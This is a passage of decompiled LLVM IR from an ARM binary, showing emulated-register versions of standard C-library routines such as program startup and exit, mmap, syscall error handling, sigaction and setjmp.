  store i1 %v3_15e5421, i1* %cpsr_c.global-to-local, align 1
  %v9_15e5427 = icmp eq i32 %v0_15e5418, %v1_15e5419
  store i1 %v9_15e5427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15e5421, label %dec_label_pc_15e88.lr.ph, label %dec_label_pc_15e44

dec_label_pc_15e44:                               ; preds = %bb84, %dec_label_pc_15e44
  %v1_15e44 = phi i32 [ %v1_15e50, %dec_label_pc_15e44 ], [ %v0_15e5418, %bb84 ]
  %v0_15e44 = load i32, i32* %r5.global-to-local, align 4
  %v2_15e44 = and i32 %v1_15e44, 1073741824
  %v3_15e44 = icmp ne i32 %v2_15e44, 0
  store i1 %v3_15e44, i1* %cpsr_c.global-to-local, align 1
  %v4_15e44 = mul i32 %v1_15e44, 4
  %v5_15e44 = add i32 %v4_15e44, %v0_15e44
  %v6_15e44 = inttoptr i32 %v5_15e44 to i32*
  %v7_15e44 = load i32, i32* %v6_15e44, align 4
  store i32 %v7_15e44, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_15e44)
  %v0_15e50 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e50 = add i32 %v0_15e50, 1
  store i32 %v1_15e50, i32* %r4.global-to-local, align 4
  %v1_15e54 = load i32, i32* %r7.global-to-local, align 4
  %v3_15e54 = icmp uge i32 %v1_15e50, %v1_15e54
  store i1 %v3_15e54, i1* %cpsr_c.global-to-local, align 1
  %v9_15e54 = icmp eq i32 %v1_15e50, %v1_15e54
  store i1 %v9_15e54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15e54, label %dec_label_pc_15e88.lr.ph, label %dec_label_pc_15e44

dec_label_pc_15e88.lr.ph:                         ; preds = %dec_label_pc_15e44, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e5c = icmp eq i32 %v0_15ca8, 0
  store i1 %v2_15e5c, i1* %cpsr_z.global-to-local, align 1
  %v2_15e64 = xor i1 %v2_15e5c, true
  call void @__pseudo_cond_branch(i1 %v2_15e64, i32 %v0_15ca8)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_15e70 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_15e7c = add i32 %v2_15e70, -12
  store i32 %v2_15e7c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15e88

dec_label_pc_15e88:                               ; preds = %dec_label_pc_15e88.dec_label_pc_15e88_crit_edge, %dec_label_pc_15e88.lr.ph
  %v1_15e88 = phi i32 [ %v1_15e94, %dec_label_pc_15e88.dec_label_pc_15e88_crit_edge ], [ 0, %dec_label_pc_15e88.lr.ph ]
  %v0_15e88 = phi i32 [ %v0_15e88.pre, %dec_label_pc_15e88.dec_label_pc_15e88_crit_edge ], [ %v2_15e7c, %dec_label_pc_15e88.lr.ph ]
  %v2_15e88 = and i32 %v1_15e88, 1073741824
  %v3_15e88 = icmp ne i32 %v2_15e88, 0
  store i1 %v3_15e88, i1* %cpsr_c.global-to-local, align 1
  %v4_15e88 = mul i32 %v1_15e88, 4
  %v5_15e88 = add i32 %v4_15e88, %v0_15e88
  %v6_15e88 = inttoptr i32 %v5_15e88 to i32*
  %v7_15e88 = load i32, i32* %v6_15e88, align 4
  store i32 %v7_15e88, i32* %ip.global-to-local, align 4
  store i32 89748, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_15e88)
  %v0_15e94 = load i32, i32* @r4, align 4
  %v1_15e94 = add i32 %v0_15e94, 1
  store i32 %v1_15e94, i32* @r4, align 4
  %v1_15e98 = load i32, i32* @r7, align 4
  %v3_15e98 = icmp uge i32 %v1_15e94, %v1_15e98
  store i1 %v3_15e98, i1* %cpsr_c.global-to-local, align 1
  %v9_15e98 = icmp eq i32 %v1_15e94, %v1_15e98
  store i1 %v9_15e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15e98, label %dec_label_pc_15ea0, label %dec_label_pc_15e88.dec_label_pc_15e88_crit_edge

dec_label_pc_15e88.dec_label_pc_15e88_crit_edge:  ; preds = %dec_label_pc_15e88
  %v0_15e88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15e88

dec_label_pc_15ea0:                               ; preds = %dec_label_pc_15e88
  %v2_15ea4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15ea4.pre, i32* %r0.global-to-local, align 4
  %v2_15ea8 = add i32 %v2_15ea4.pre, -67316
  store i32 %v2_15ea8, i32* %r2.global-to-local, align 4
  store i32 %v2_15ea8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15eb0 = icmp eq i32 %v2_15ea8, 0
  store i1 %v2_15eb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15eb0, label %dec_label_pc_15ec8, label %dec_label_pc_15eb8

dec_label_pc_15eb8:                               ; preds = %dec_label_pc_15ea0
  store i32 89792, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_15ea8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15ec4 = load i32, i32* %r0.global-to-local, align 4
  %v2_15ec4 = inttoptr i32 %v1_15ec4 to i32*
  store i32 0, i32* %v2_15ec4, align 4
  %v2_15ecc.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_15ec8

dec_label_pc_15ec8:                               ; preds = %dec_label_pc_15ea0, %dec_label_pc_15eb8
  %v2_15ecc = phi i32 [ %v2_15ea4.pre, %dec_label_pc_15ea0 ], [ %v2_15ecc.pre, %dec_label_pc_15eb8 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_15ecc, i32* %r1.global-to-local, align 4
  %v2_15ed0 = add i32 %v2_15ecc, 128
  %v3_15ed0 = inttoptr i32 %v2_15ed0 to i32*
  %v4_15ed0 = load i32, i32* %v3_15ed0, align 4
  store i32 %v4_15ed0, i32* %r2.global-to-local, align 4
  store i32 %v4_15ed0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ed8 = icmp eq i32 %v4_15ed0, 0
  store i1 %v2_15ed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ed8, label %dec_label_pc_15ef0, label %dec_label_pc_15ee0

dec_label_pc_15ee0:                               ; preds = %dec_label_pc_15ec8
  store i32 89832, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15ed0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15eec = load i32, i32* %r0.global-to-local, align 4
  %v2_15eec = inttoptr i32 %v1_15eec to i32*
  store i32 0, i32* %v2_15eec, align 4
  br label %dec_label_pc_15ef0

dec_label_pc_15ef0:                               ; preds = %dec_label_pc_15ec8, %dec_label_pc_15ee0
  %v2_15ef0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_15ef0, i32* @r0, align 4
  %v1_15ef4 = call i32 @_setjmp(i32 %v2_15ef0)
  store i32 %v1_15ef4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ef8 = icmp eq i32 %v1_15ef4, 0
  store i1 %v2_15ef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ef8, label %dec_label_pc_15f00, label %dec_label_pc_15f4c

dec_label_pc_15f00:                               ; preds = %dec_label_pc_15ef0
  %v0_15f00 = call i32 @__aeabi_read_tp()
  store i32 %v0_15f00, i32* %r0.global-to-local, align 4
  %v1_15f04 = add i32 %v0_15f00, -1168
  store i32 %v1_15f04, i32* %r2.global-to-local, align 4
  %v2_15f0c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15f0c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_15f18 = add i32 %v2_15f0c, 56
  %v3_15f18 = inttoptr i32 %v2_15f18 to i32*
  %v4_15f18 = load i32, i32* %v3_15f18, align 4
  store i32 %v4_15f18, i32* %ip.global-to-local, align 4
  store i32 %v2_15ef0, i32* %r3.global-to-local, align 4
  %v2_15f28 = add i32 %v0_15f00, -1040
  %v3_15f28 = inttoptr i32 %v2_15f28 to i32*
  store i32 %v2_15ef0, i32* %v3_15f28, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_15f34 = load i32, i32* %ip.global-to-local, align 4
  %v1_15f34 = inttoptr i32 %v0_15f34 to i32*
  %v2_15f34 = load i32, i32* %v1_15f34, align 4
  store i32 %v2_15f34, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_15f44 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15fe8

dec_label_pc_15f4c:                               ; preds = %dec_label_pc_15ef0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_15f50 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15f50, i32* %ip.global-to-local, align 4
  %v2_15f54 = add i32 %v2_15f50, 40
  %v3_15f54 = inttoptr i32 %v2_15f54 to i32*
  %v4_15f54 = load i32, i32* %v3_15f54, align 4
  store i32 %v4_15f54, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15f54)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_15f64 = load i32, i32* %stack_var_-416, align 4
  %v2_15f68 = add i32 %v2_15f64, 120
  %v3_15f68 = inttoptr i32 %v2_15f68 to i32*
  %v4_15f68 = load i32, i32* %v3_15f68, align 4
  store i32 %v4_15f68, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15f6c

dec_label_pc_15f6c:                               ; preds = %dec_label_pc_15fa0.dec_label_pc_15f6c_crit_edge, %dec_label_pc_15f4c
  %v0_15f6c = phi i32 [ %v0_15f6c.pre, %dec_label_pc_15fa0.dec_label_pc_15f6c_crit_edge ], [ %v4_15f68, %dec_label_pc_15f4c ]
  %v1_15f6c = inttoptr i32 %v0_15f6c to i32*
  %v2_15f6c = load i32, i32* %v1_15f6c, align 4
  store i32 %v0_15f6c, i32* %r2.global-to-local, align 4
  store i32 %v2_15f6c, i32* %r4.global-to-local, align 4
  %v1_15f78 = add i32 %v2_15f6c, -1
  store i32 %v1_15f78, i32* %r1.global-to-local, align 4
  %v2_15f7c89 = load i32, i32* %v1_15f6c, align 4
  store i32 %v2_15f7c89, i32* %r3.global-to-local, align 4
  %v3_15f8091 = icmp uge i32 %v2_15f7c89, %v2_15f6c
  store i1 %v3_15f8091, i1* %cpsr_c.global-to-local, align 1
  %v9_15f8097 = icmp eq i32 %v2_15f7c89, %v2_15f6c
  store i1 %v9_15f8097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15f8097, label %dec_label_pc_15f88, label %dec_label_pc_15fa0

dec_label_pc_15f88:                               ; preds = %dec_label_pc_15f6c, %dec_label_pc_15f88.dec_label_pc_15f7c_crit_edge
  %v0_15f8898 = phi i32 [ %v1_15f80.pre, %dec_label_pc_15f88.dec_label_pc_15f7c_crit_edge ], [ %v2_15f6c, %dec_label_pc_15f6c ]
  store i32 %v0_15f8898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15f98 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15f98, label %dec_label_pc_15f9c, label %dec_label_pc_15f88.dec_label_pc_15f7c_crit_edge

dec_label_pc_15f88.dec_label_pc_15f7c_crit_edge:  ; preds = %dec_label_pc_15f88
  %v0_15f7c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15f80.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15f7c = inttoptr i32 %v0_15f7c.pre to i32*
  %v2_15f7c = load i32, i32* %v1_15f7c, align 4
  store i32 %v2_15f7c, i32* %r3.global-to-local, align 4
  %v3_15f80 = icmp uge i32 %v2_15f7c, %v1_15f80.pre
  store i1 %v3_15f80, i1* %cpsr_c.global-to-local, align 1
  %v9_15f80 = icmp eq i32 %v2_15f7c, %v1_15f80.pre
  store i1 %v9_15f80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15f80, label %dec_label_pc_15f88, label %dec_label_pc_15fa0

dec_label_pc_15f9c:                               ; preds = %dec_label_pc_15f88
  %v0_15f9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15f9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15fa0

dec_label_pc_15fa0:                               ; preds = %dec_label_pc_15f6c, %dec_label_pc_15f88.dec_label_pc_15f7c_crit_edge, %dec_label_pc_15f9c
  %v0_15fa8 = phi i32 [ %v0_15f9c, %dec_label_pc_15f9c ], [ %v2_15f7c89, %dec_label_pc_15f6c ], [ %v2_15f7c, %dec_label_pc_15f88.dec_label_pc_15f7c_crit_edge ]
  %v1_15fa0 = phi i32 [ %v0_15f9c, %dec_label_pc_15f9c ], [ %v2_15f6c, %dec_label_pc_15f6c ], [ %v1_15f80.pre, %dec_label_pc_15f88.dec_label_pc_15f7c_crit_edge ]
  %v3_15fa0 = icmp uge i32 %v0_15fa8, %v1_15fa0
  store i1 %v3_15fa0, i1* %cpsr_c.global-to-local, align 1
  %v9_15fa0 = icmp eq i32 %v0_15fa8, %v1_15fa0
  store i1 %v9_15fa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15fa0, label %dec_label_pc_15fa8, label %dec_label_pc_15fa0.dec_label_pc_15f6c_crit_edge

dec_label_pc_15fa0.dec_label_pc_15f6c_crit_edge:  ; preds = %dec_label_pc_15fa0
  %v0_15f6c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15f6c

dec_label_pc_15fa8:                               ; preds = %dec_label_pc_15fa0
  %v2_15fa8 = icmp ne i32 %v1_15fa0, 0
  store i1 %v2_15fa8, i1* %cpsr_c.global-to-local, align 1
  %v7_15fa8 = icmp eq i32 %v1_15fa0, 1
  store i1 %v7_15fa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15fa8, label %dec_label_pc_15fe8, label %dec_label_pc_15fb0

dec_label_pc_15fb0:                               ; preds = %dec_label_pc_15fa8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15fe8

dec_label_pc_15fe8:                               ; preds = %dec_label_pc_15fa8, %dec_label_pc_15fb0, %dec_label_pc_15f00
  %storemerge2 = phi i32 [ %v0_15f44, %dec_label_pc_15f00 ], [ 0, %dec_label_pc_15fb0 ], [ 0, %dec_label_pc_15fa8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_15fec = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_15fec, i32* %r0.global-to-local, align 4
  %v0_15ff0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15ff0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_15fe8
  %v2_15ff4 = load i32, i32* @r8, align 4
  %v8_15ff4 = shl i32 %v2_15ff4, %v1_15fec
  %v9_15ff4 = and i32 %v8_15ff4, %v1_15fec
  %v8_15ff8 = lshr i32 %v2_15ff4, %v9_15ff4
  %v9_15ff8 = and i32 %v8_15ff8, %v9_15ff4
  %v2_15ffc = inttoptr i32 %v9_15ff8 to i64*
  %v3_15ffc = load i64, i64* %v2_15ffc, align 4
  %v4_15ffc = load i32, i32* %r4.global-to-local, align 4
  %v5_15ffc = trunc i64 %v3_15ffc to i32
  %v6_15ffc = udiv i64 %v3_15ffc, 4294967296
  %v7_15ffc = trunc i64 %v6_15ffc to i32
  store i32 %v5_15ffc, i32* %r1.global-to-local, align 4
  %v9_15ffc = sub i32 %v7_15ffc, %v4_15ffc
  %v3_16000 = mul i32 %v9_15ffc, %v4_15ffc
  %v5_16008 = mul i32 %v3_16000, 4
  %v5_1600c = udiv i32 %v4_15ffc, 2
  %v6_16008 = and i32 %v3_16000, %v5_1600c
  %v6_1600c = and i32 %v6_16008, %v5_16008
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_1600c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_15fe8, %bb85
  %v5_16010 = phi i32 [ %v1_15fec, %dec_label_pc_15fe8 ], [ %v6_1600c, %bb85 ]
  ret i32 %v5_16010

; uselistorder directives
  uselistorder i32 %v3_16000, { 1, 0 }
  uselistorder i32 %v1_15fec, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_15fa0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15f9c, { 1, 0, 2 }
  uselistorder i32 %v1_15f80.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15f6c, { 1, 0 }
  uselistorder i32 %v2_15ecc, { 1, 0 }
  uselistorder i32 %v2_15ea4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_15e98, { 1, 0 }
  uselistorder i32 %v1_15e94, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15e88, { 1, 0 }
  uselistorder i32 %v1_15e54, { 1, 0 }
  uselistorder i32 %v1_15e50, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15e44, { 1, 0 }
  uselistorder i32 %v2_15e20, { 1, 0, 2 }
  uselistorder i32 %v4_15e04, { 1, 0, 2 }
  uselistorder i32 %v4_15df4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_15d3c, { 1, 2, 0 }
  uselistorder i32 %v2_15d08, { 1, 2, 0 }
  uselistorder i32 %v1_15d04, { 1, 2, 0 }
  uselistorder i1 %v2_15cf0, { 1, 0, 2 }
  uselistorder i32 %v5_15cf4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15cc0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15ca8, { 1, 0, 2 }
  uselistorder i32 %v2_15c9c, { 1, 0, 2 }
  uselistorder i32 %v3_15c6c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 2, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 1, 3, 4, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 1, 13, 14, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 3, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 0, 10, 11, 12, 14, 13, 1, 15, 17, 16, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 3, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 8, 7, 6, 3, 4, 5 }
  uselistorder i32 2004, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_15fe8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15fa0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15f88, { 1, 0 }
  uselistorder label %dec_label_pc_15ef0, { 1, 0 }
  uselistorder label %dec_label_pc_15ec8, { 1, 0 }
  uselistorder label %dec_label_pc_15e44, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15dc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15d98, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_15d08, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_15cf0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1603c = load i32, i32* @r4, align 4
  store i32 %v3_1603c, i32* %stack_var_-16, align 4
  %v3_16048 = urem i32 %arg3, 4096
  %v2_1604c = icmp eq i32 %v3_16048, 0
  br i1 %v2_1604c, label %dec_label_pc_16070, label %dec_label_pc_16054

dec_label_pc_16054:                               ; preds = %entry
  %v0_16058 = call i32 @__aeabi_read_tp()
  store i32 %v0_16058, i32* %r0.global-to-local, align 4
  %v3_1605c = load i16, i16* @global_var_23068.362, align 2
  %v4_1605c = sext i16 %v3_1605c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16068 = add i32 %v4_1605c, %v0_16058
  %v4_16068 = inttoptr i32 %v3_16068 to i32*
  store i32 22, i32* %v4_16068, align 4
  %v0_160a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_160a4

dec_label_pc_16070:                               ; preds = %entry
  %v0_16080 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16080, -4095
  br i1 %tmp, label %dec_label_pc_160a0, label %dec_label_pc_16088

dec_label_pc_16088:                               ; preds = %dec_label_pc_16070
  %v1_1608c = sub i32 0, %v0_16080
  %v3_16090 = load i16, i16* @global_var_23068.362, align 2
  %v4_16090 = sext i16 %v3_16090 to i32
  %v0_16094 = call i32 @__aeabi_read_tp()
  %v3_16098 = add i32 %v4_16090, %v0_16094
  %v4_16098 = inttoptr i32 %v3_16098 to i32*
  store i32 %v1_1608c, i32* %v4_16098, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_160a0

dec_label_pc_160a0:                               ; preds = %dec_label_pc_16070, %dec_label_pc_16088
  %v0_160a0 = phi i32 [ %v0_16080, %dec_label_pc_16070 ], [ -1, %dec_label_pc_16088 ]
  store i32 %v0_160a0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_160a4

dec_label_pc_160a4:                               ; preds = %dec_label_pc_16054, %dec_label_pc_160a0
  %v0_160a4 = phi i32 [ %v0_160a4.pre, %dec_label_pc_16054 ], [ %v0_160a0, %dec_label_pc_160a0 ]
  store i32 %v0_160a4, i32* %r0.global-to-local, align 4
  %v2_160a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_160a8, i32* @r4, align 4
  ret i32 %v0_160a4

; uselistorder directives
  uselistorder i32 %v0_160a4, { 1, 0 }
  uselistorder i32 %v0_16080, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_160a4, { 1, 0 }
  uselistorder label %dec_label_pc_160a0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_160b8 = load i32, i32* @lr, align 4
  store i32 %v0_160b8, i32* %stack_var_-4, align 4
  %v0_160c0 = load i32, i32* @r0, align 4
  %v3_160c4 = load i16, i16* @global_var_23068.362, align 2
  %v4_160c4 = sext i16 %v3_160c4 to i32
  store i32 %v4_160c4, i32* @r2, align 4
  %v0_160c8 = call i32 @__aeabi_read_tp()
  %v1_160cc = sub i32 0, %v0_160c0
  store i32 %v1_160cc, i32* @r3, align 4
  %v2_160d0 = load i32, i32* @r2, align 4
  %v3_160d0 = add i32 %v2_160d0, %v0_160c8
  %v4_160d0 = inttoptr i32 %v3_160d0 to i32*
  store i32 %v1_160cc, i32* %v4_160d0, align 4
  %v2_160d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_160d8, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_160e4 = load i32, i32* @r4, align 4
  %v6_160e4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_160ec = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_160ec, label %dec_label_pc_16140, label %dec_label_pc_16104

dec_label_pc_16104:                               ; preds = %entry
  %v1_16104 = add i32 %arg2, 4
  %v2_16104 = inttoptr i32 %v1_16104 to i32*
  %v3_16104 = load i32, i32* %v2_16104, align 4
  store i32 %v3_16104, i32* @r3, align 4
  %v1_16108 = and i32 %v3_16104, 67108864
  %v2_16108 = icmp eq i32 %v1_16108, 0
  br i1 %v2_16108, label %dec_label_pc_16110, label %dec_label_pc_16140

dec_label_pc_16110:                               ; preds = %dec_label_pc_16104
  store i32 20, i32* @r2, align 4
  %v2_16114 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_16114, i32* @r0, align 4
  %v0_16118 = call i32 @memcpy()
  store i32 %v2_16114, i32* @ip, align 4
  %v0_16140.pre = load i32, i32* @r5, align 4
  %v0_16148.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16140

dec_label_pc_16140:                               ; preds = %dec_label_pc_16104, %entry, %dec_label_pc_16110
  %v0_16148 = phi i32 [ %arg3, %dec_label_pc_16104 ], [ %arg3, %entry ], [ %v0_16148.pre, %dec_label_pc_16110 ]
  %v0_16144 = phi i32 [ %arg2, %dec_label_pc_16104 ], [ 0, %entry ], [ %v2_16114, %dec_label_pc_16110 ]
  %v0_16140 = phi i32 [ %arg1, %dec_label_pc_16104 ], [ %arg1, %entry ], [ %v0_16140.pre, %dec_label_pc_16110 ]
  %v4_16150 = call i32 @__syscall_rt_sigaction(i32 %v0_16140, i32 %v0_16144, i32 %v0_16148, i32 8)
  store i32 %v3_160e4, i32* @r4, align 4
  store i32 %v6_160e4, i32* @r5, align 4
  ret i32 %v4_16150

; uselistorder directives
  uselistorder label %dec_label_pc_16140, { 2, 0, 1 }
}

define i32 @function_16164(i32 %arg1) local_unnamed_addr {
dec_label_pc_16164:
  %v0_16164 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16164, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16164
  %v2_16164 = load i32, i32* @r8, align 4
  %v4_16164 = mul i32 %v2_16164, 2
  %v5_16164 = and i32 %v4_16164, %arg1
  %v2_16168 = load i32, i32* @ip, align 4
  %v4_16168 = lshr i32 %v2_16168, %v5_16164
  %v5_16168 = sub i32 32, %v5_16164
  %v6_16168 = shl i32 %v2_16168, %v5_16168
  %v7_16168 = or i32 %v6_16168, %v4_16168
  %v9_16168 = and i32 %v7_16168, %v5_16164
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16164, %bb
  %v10_16168 = phi i32 [ %arg1, %dec_label_pc_16164 ], [ %v9_16168, %bb ]
  ret i32 %v10_16168

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_16170 = call i32 @__sigsetjmp()
  ret i32 %v0_16170
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_161a0 = load i32, i32* @r7, align 4
  store i32 %v3_161a0, i32* %stack_var_-8, align 4
